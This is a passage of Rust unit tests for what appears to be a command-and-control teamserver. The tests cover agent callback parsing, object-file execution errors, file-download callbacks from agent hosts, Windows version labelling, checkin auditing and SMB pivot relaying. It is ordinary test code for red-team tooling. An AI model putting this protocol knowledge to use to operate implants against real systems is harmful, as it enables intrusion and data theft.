                .and_then(|v| v.as_str())
                .map(|s| s.contains("0xC0000005") && s.contains("0x00007FF7DEADBEEF"))
                .unwrap_or(false),
            "exception message must include code and address"
        );

        // BOF_SYMBOL_NOT_FOUND (2): missing symbol name
        let mut sym = Vec::new();
        add_u32(&mut sym, 2);
        add_bytes(&mut sym, b"kernel32.VirtualAllocEx");
        dispatcher
            .dispatch(0xB0B1B2B3, u32::from(DemonCommand::CommandInlineExecute), 4, &sym)
            .await?;
        let event = receiver.recv().await.ok_or("bof symbol-not-found response missing")?;
        let OperatorMessage::AgentResponse(sym_message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            sym_message.info.extra.get("Message"),
            Some(&Value::String("Symbol not found: kernel32.VirtualAllocEx".to_owned()))
        );

        // BOF_COULD_NOT_RUN (4): loader failed to start
        let mut no_run = Vec::new();
        add_u32(&mut no_run, 4);
        dispatcher
            .dispatch(0xB0B1B2B3, u32::from(DemonCommand::CommandInlineExecute), 5, &no_run)
            .await?;
        let event = receiver.recv().await.ok_or("bof could-not-run response missing")?;
        let OperatorMessage::AgentResponse(no_run_message) = event else {
            panic!("expected agent response event");
        };
        assert_eq!(
            no_run_message.info.extra.get("Message"),
            Some(&Value::String("Failed to execute object file".to_owned()))
        );

        Ok(())
    }

    fn add_u32(buf: &mut Vec<u8>, value: u32) {
        buf.extend_from_slice(&value.to_le_bytes());
    }

    fn add_u64(buf: &mut Vec<u8>, value: u64) {
        buf.extend_from_slice(&value.to_le_bytes());
    }

    fn add_bytes(buf: &mut Vec<u8>, value: &[u8]) {
        add_u32(buf, u32::try_from(value.len()).unwrap_or_default());
        buf.extend_from_slice(value);
    }

    fn add_utf16(buf: &mut Vec<u8>, value: &str) {
        let mut encoded: Vec<u8> = value.encode_utf16().flat_map(u16::to_le_bytes).collect();
        encoded.extend_from_slice(&[0, 0]);
        add_bytes(buf, &encoded);
    }

    fn beacon_file_open(file_id: u32, expected_size: u32, remote_path: &str) -> Vec<u8> {
        let mut header = Vec::new();
        header.extend_from_slice(&file_id.to_be_bytes());
        header.extend_from_slice(&expected_size.to_be_bytes());
        header.extend_from_slice(remote_path.as_bytes());
        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonCallback::File));
        add_bytes(&mut payload, &header);
        payload
    }

    fn beacon_file_write(file_id: u32, chunk: &[u8]) -> Vec<u8> {
        let mut bytes = Vec::new();
        bytes.extend_from_slice(&file_id.to_be_bytes());
        bytes.extend_from_slice(chunk);
        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonCallback::FileWrite));
        add_bytes(&mut payload, &bytes);
        payload
    }

    fn beacon_file_close(file_id: u32) -> Vec<u8> {
        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonCallback::FileClose));
        add_bytes(&mut payload, &file_id.to_be_bytes());
        payload
    }

    fn filesystem_download_open(file_id: u32, expected_size: u64, remote_path: &str) -> Vec<u8> {
        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonFilesystemCommand::Download));
        add_u32(&mut payload, 0);
        add_u32(&mut payload, file_id);
        add_u64(&mut payload, expected_size);
        add_utf16(&mut payload, remote_path);
        payload
    }

    fn filesystem_download_write(file_id: u32, chunk: &[u8]) -> Vec<u8> {
        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonFilesystemCommand::Download));
        add_u32(&mut payload, 1);
        add_u32(&mut payload, file_id);
        add_bytes(&mut payload, chunk);
        payload
    }

    fn filesystem_download_close(file_id: u32, reason: u32) -> Vec<u8> {
        let mut payload = Vec::new();
        add_u32(&mut payload, u32::from(DemonFilesystemCommand::Download));
        add_u32(&mut payload, 2);
        add_u32(&mut payload, file_id);
        add_u32(&mut payload, reason);
        payload
    }

    // -----------------------------------------------------------------
    // checkin_windows_arch_label
    // -----------------------------------------------------------------

    #[test]
    fn windows_arch_label_known_values() {
        let cases: &[(u32, &str)] =
            &[(0, "x86"), (9, "x64/AMD64"), (5, "ARM"), (12, "ARM64"), (6, "Itanium-based")];
        for &(value, expected) in cases {
            assert_eq!(
                checkin_windows_arch_label(value),
                expected,
                "arch value {value} should map to \"{expected}\""
            );
        }
    }

    #[test]
    fn windows_arch_label_unknown_falls_back() {
        for value in [2_u32, 3, 7, 8, 10, 11, 99, u32::MAX] {
            assert_eq!(
                checkin_windows_arch_label(value),
                "Unknown",
                "arch value {value} should map to \"Unknown\""
            );
        }
    }

    // -----------------------------------------------------------------
    // checkin_windows_version_label
    // -----------------------------------------------------------------

    #[test]
    fn windows_version_label_known_versions() {
        const WORKSTATION: u32 = 1;
        const SERVER: u32 = 3; // any value != VER_NT_WORKSTATION (1)

        let cases: &[((u32, u32, u32, u32, u32), &str)] = &[
            // (major, minor, product_type, service_pack, build) → expected prefix
            ((10, 0, SERVER, 0, 20_348), "Windows 2022 Server 22H2"),
            ((10, 0, SERVER, 0, 17_763), "Windows 2019 Server"),
            ((10, 0, WORKSTATION, 0, 22_000), "Windows 11"),
            ((10, 0, WORKSTATION, 0, 22_621), "Windows 11"),
            ((10, 0, SERVER, 0, 99_999), "Windows 2016 Server"),
            ((10, 0, WORKSTATION, 0, 19_045), "Windows 10"),
            ((6, 3, SERVER, 0, 0), "Windows Server 2012 R2"),
            ((6, 3, WORKSTATION, 0, 0), "Windows 8.1"),
            ((6, 2, SERVER, 0, 0), "Windows Server 2012"),
            ((6, 2, WORKSTATION, 0, 0), "Windows 8"),
            ((6, 1, SERVER, 0, 0), "Windows Server 2008 R2"),
            ((6, 1, WORKSTATION, 0, 0), "Windows 7"),
        ];
        for &((major, minor, product_type, sp, build), expected) in cases {
            let label = checkin_windows_version_label(major, minor, product_type, sp, build);
            assert_eq!(
                label, expected,
                "({major}, {minor}, {product_type}, {sp}, {build}) should produce \"{expected}\""
            );
        }
    }

    #[test]
    fn windows_version_label_appends_service_pack() {
        // Windows 7 workstation with SP1
        let label = checkin_windows_version_label(6, 1, 1, 1, 0);
        assert_eq!(label, "Windows 7 Service Pack 1");

        // Windows Server 2008 R2 with SP2
        let label = checkin_windows_version_label(6, 1, 3, 2, 0);
        assert_eq!(label, "Windows Server 2008 R2 Service Pack 2");
    }

    #[test]
    fn windows_version_label_no_service_pack_suffix_when_zero() {
        let label = checkin_windows_version_label(6, 1, 1, 0, 0);
        assert!(!label.contains("Service Pack"), "label should not contain service pack suffix");
    }

    #[test]
    fn windows_version_label_unknown_falls_back() {
        let label = checkin_windows_version_label(5, 1, 1, 0, 0);
        assert_eq!(label, "Unknown");

        // Build in Windows 11 range but wrong product type for 2022 or 2019
        let label = checkin_windows_version_label(99, 0, 1, 0, 0);
        assert_eq!(label, "Unknown");
    }

    #[tokio::test]
    async fn builtin_checkin_handler_records_agent_checkin_audit_entry()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database.clone(),
            sockets,
            None,
        );
        let key = [0x77; AGENT_KEY_LENGTH];
        let iv = [0x44; AGENT_IV_LENGTH];
        let agent_id = 0xABCD_1234_u32;

        registry.insert(sample_agent_info(agent_id, key, iv)).await?;
        dispatcher.dispatch(agent_id, u32::from(DemonCommand::CommandCheckin), 6, &[]).await?;

        // The audit write is spawned as a background task; yield to let it complete.
        tokio::task::yield_now().await;
        tokio::task::yield_now().await;

        let entries = database.audit_log().list().await?;
        let checkin_entry = entries.iter().find(|e| e.action == "agent.checkin").expect(
            "a checkin audit entry with action=\"agent.checkin\" should have been persisted",
        );
        assert_eq!(checkin_entry.actor, "teamserver");
        assert_eq!(checkin_entry.target_kind, "agent");
        assert_eq!(checkin_entry.target_id.as_deref(), Some("ABCD1234"));
        let details =
            checkin_entry.details.as_ref().expect("checkin audit entry must include details");
        assert_eq!(details["result_status"], "success");
        assert_eq!(details["command"], "checkin");
        assert_eq!(details["agent_id"], "ABCD1234");
        Ok(())
    }

    /// Build a pivot SmbCommand payload wrapping the given inner callback envelope bytes.
    fn pivot_command_payload(inner_envelope: &[u8]) -> Vec<u8> {
        let mut payload = Vec::new();
        payload.extend_from_slice(&u32::from(DemonPivotCommand::SmbCommand).to_le_bytes());
        add_bytes(&mut payload, inner_envelope);
        payload
    }

    /// Build a valid Demon callback envelope for `agent_id` containing a single callback
    /// package with the given `command_id`, `request_id`, and inner payload bytes.
    fn valid_callback_envelope(
        agent_id: u32,
        key: &[u8; AGENT_KEY_LENGTH],
        iv: &[u8; AGENT_IV_LENGTH],
        command_id: u32,
        request_id: u32,
        inner_payload: &[u8],
    ) -> Vec<u8> {
        // The callback plaintext is: length-prefixed payload (BE) for the first package.
        let mut plaintext = Vec::new();
        plaintext.extend_from_slice(
            &u32::try_from(inner_payload.len()).unwrap_or_default().to_be_bytes(),
        );
        plaintext.extend_from_slice(inner_payload);

        let encrypted = red_cell_common::crypto::encrypt_agent_data(key, iv, &plaintext)
            .expect("callback payload encryption should succeed");

        let mut envelope_payload = Vec::new();
        envelope_payload.extend_from_slice(&command_id.to_be_bytes());
        envelope_payload.extend_from_slice(&request_id.to_be_bytes());
        envelope_payload.extend_from_slice(&encrypted);

        red_cell_common::demon::DemonEnvelope::new(agent_id, envelope_payload)
            .unwrap_or_else(|error| panic!("failed to build callback envelope: {error}"))
            .to_bytes()
    }

    #[tokio::test]
    async fn pivot_command_callback_dispatches_inner_package_and_emits_mark_event()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let mut receiver = events.subscribe();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database,
            sockets,
            None,
        );

        let parent_id = 0x1111_2222;
        let parent_key = [0xAA; AGENT_KEY_LENGTH];
        let parent_iv = [0xBB; AGENT_IV_LENGTH];
        let child_id = 0x3333_4444;
        let child_key = [0xCC; AGENT_KEY_LENGTH];
        let child_iv = [0xDD; AGENT_IV_LENGTH];

        // Register both parent and child agents.
        registry.insert(sample_agent_info(parent_id, parent_key, parent_iv)).await?;
        registry.insert(sample_agent_info(child_id, child_key, child_iv)).await?;
        registry.add_link(parent_id, child_id).await?;

        // Enqueue a job on the child so we can verify the command handler sees the right
        // agent_id.  We use CommandOutput as a simple builtin that broadcasts an event.
        registry
            .enqueue_job(
                child_id,
                Job {
                    command: u32::from(DemonCommand::CommandOutput),
                    request_id: 0x42,
                    payload: Vec::new(),
                    command_line: "test-cmd".to_owned(),
                    task_id: "task-42".to_owned(),
                    created_at: "2026-03-17T12:00:00Z".to_owned(),
                    operator: "operator".to_owned(),
                },
            )
            .await?;

        // Build a callback from the child agent containing a CommandOutput response.
        let mut inner_output = Vec::new();
        add_bytes(&mut inner_output, b"hello from pivot child");

        let inner_envelope = valid_callback_envelope(
            child_id,
            &child_key,
            &child_iv,
            u32::from(DemonCommand::CommandOutput),
            0x42,
            &inner_output,
        );
        let payload = pivot_command_payload(&inner_envelope);

        let response = dispatcher
            .dispatch(parent_id, u32::from(DemonCommand::CommandPivot), 1, &payload)
            .await?;
        assert_eq!(response, None);

        // First event should be the agent update (mark) event from last_call_in update.
        let mark_event =
            receiver.recv().await.ok_or("expected AgentUpdate event after pivot command")?;
        let OperatorMessage::AgentUpdate(update) = mark_event else {
            return Err(format!("expected AgentUpdate, got {mark_event:?}").into());
        };
        assert_eq!(
            update.info.agent_id,
            format!("{child_id:08x}"),
            "update event must be for the child agent"
        );

        // Second event should be the output response from the inner CommandOutput handler.
        let output_event =
            receiver.recv().await.ok_or("expected AgentResponse from inner command handler")?;
        let OperatorMessage::AgentResponse(msg) = output_event else {
            return Err(format!("expected AgentResponse, got {output_event:?}").into());
        };
        assert_eq!(
            msg.info.demon_id,
            format!("{child_id:08X}"),
            "output event must reference the child agent"
        );
        Ok(())
    }

    #[tokio::test]
    async fn pivot_command_callback_unknown_inner_agent_returns_error()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database,
            sockets,
            None,
        );

        let parent_id = 0xAAAA_BBBB;
        let parent_key = [0x11; AGENT_KEY_LENGTH];
        let parent_iv = [0x22; AGENT_IV_LENGTH];
        registry.insert(sample_agent_info(parent_id, parent_key, parent_iv)).await?;

        // Build an envelope for a non-existent inner agent.
        let unknown_child_id = 0xDEAD_FACE;
        let fake_key = [0x99; AGENT_KEY_LENGTH];
        let fake_iv = [0x88; AGENT_IV_LENGTH];
        let inner_envelope = valid_callback_envelope(
            unknown_child_id,
            &fake_key,
            &fake_iv,
            u32::from(DemonCommand::CommandOutput),
            1,
            &[],
        );
        let payload = pivot_command_payload(&inner_envelope);

        let result = dispatcher
            .dispatch(parent_id, u32::from(DemonCommand::CommandPivot), 1, &payload)
            .await;

        assert!(result.is_err(), "unknown inner agent must produce an error, not panic");
        Ok(())
    }

    #[tokio::test]
    async fn pivot_command_callback_truncated_inner_payload_returns_error()
    -> Result<(), Box<dyn std::error::Error>> {
        let database = Database::connect_in_memory().await?;
        let registry = AgentRegistry::new(database.clone());
        let events = EventBus::default();
        let sockets = SocketRelayManager::new(registry.clone(), events.clone());
        let dispatcher = CommandDispatcher::with_builtin_handlers(
            registry.clone(),
            events,
            database,
            sockets,
            None,
        );

        let parent_id = 0xBBCC_DDEE;
        let parent_key = [0x33; AGENT_KEY_LENGTH];
        let parent_iv = [0x44; AGENT_IV_LENGTH];
        registry.insert(sample_agent_info(parent_id, parent_key, parent_iv)).await?;

        // Build a pivot SmbCommand payload with truncated inner data (too short for an
        // envelope header).
        let truncated_inner = vec![0xDE, 0xAD];
        let payload = pivot_command_payload(&truncated_inner);

        let result = dispatcher
            .dispatch(parent_id, u32::from(DemonCommand::CommandPivot), 1, &payload)
            .await;

        assert!(result.is_err(), "truncated inner payload must produce a parse error, not panic");
        Ok(())
    }
}
